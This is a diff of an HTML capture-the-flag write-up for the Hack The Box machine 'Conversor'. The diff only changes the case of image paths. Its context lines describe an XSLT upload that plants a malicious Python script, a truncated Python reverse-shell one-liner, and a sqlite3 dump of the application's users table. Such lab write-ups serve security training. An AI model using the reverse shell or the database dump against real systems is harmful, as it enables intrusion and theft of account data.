@@ -250,7 +250,7 @@
 <div class="wrap">
 
 <header class="page-header">
-  <img class="machine-icon" src="/pngs/HTB/easy/Conversor/a02c6f24-5b8e-4e41-919e-40464d7c1a18.png" alt="Conversor machine icon from Hack The Box" loading="lazy">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Conversor/a02c6f24-5b8e-4e41-919e-40464d7c1a18.png" alt="Conversor machine icon from Hack The Box" loading="lazy">
   <div class="meta">
     <h1>Conversor</h1>
     <div class="tags">
@@ -294,7 +294,7 @@
 
 <p>We can see that it converts XML and XSLT files.</p>
 <figure>
-  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212160857.png" alt="XML-to-XSLT conversion page on the web application" loading="lazy">
+  <img src="/pngs/HTB/Easy/Conversor/Pasted image 20251212160857.png" alt="XML-to-XSLT conversion page on the web application" loading="lazy">
 </figure>
 
 <p>We can find and download an XSLT template.</p>
@@ -304,7 +304,7 @@
 <p>If we read <code>app.py</code> inside the <code>source</code> folder, we can see some important information, like where <code>users.db</code> is and that the database uses <code>sqlite3</code>.</p>
 
 <figure>
-  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212162337.png" alt="app.py source code showing the users.db location and sqlite3 usage" loading="lazy">
+  <img src="/pngs/HTB/Easy/Conversor/Pasted image 20251212162337.png" alt="app.py source code showing the users.db location and sqlite3 usage" loading="lazy">
 </figure>
 
 <h2 id="foothold">Foothold</h2>
@@ -326,7 +326,7 @@
 
 <p>Then we upload the default <code>.xslt</code> template that is provided to us, just to check how it functions and to check the traffic through Burp.</p>
 <figure>
-  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212164958.png" alt="Burp Suite traffic showing the default XSLT template upload" loading="lazy">
+  <img src="/pngs/HTB/Easy/Conversor/Pasted image 20251212164958.png" alt="Burp Suite traffic showing the default XSLT template upload" loading="lazy">
 </figure>
 
 <p>We can see that the file is uploaded. Now we want to upload a new one, and by uploading it, we create the malicious <code>.py</code> file at the same time.</p>
@@ -349,7 +349,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 <p>Before we upload the proper Python script, we open our listener. Then we can upload and click the <code>.html</code> file that was created. We wait for a minute and we can see that we got the shell.</p>
 <figure>
-  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212170426.png" alt="Reverse shell received on the listener after the scheduled script ran" loading="lazy">
+  <img src="/pngs/HTB/Easy/Conversor/Pasted image 20251212170426.png" alt="Reverse shell received on the listener after the scheduled script ran" loading="lazy">
 </figure>
 
 <h2 id="user">User Access</h2>
@@ -383,7 +383,7 @@ sqlite3 ./users.db "SELECT * FROM users;"</div>
 </div>
 
 <figure>
-  <img src="/pngs/HTB/easy/Conversor/Pasted image 20251212170734.png" alt="sqlite3 query output listing the application's users" loading="lazy">
+  <img src="/pngs/HTB/Easy/Conversor/Pasted image 20251212170734.png" alt="sqlite3 query output listing the application's users" loading="lazy">
 </figure>
 
 <p>Because it is live, we can see other users who created new accounts.</p>
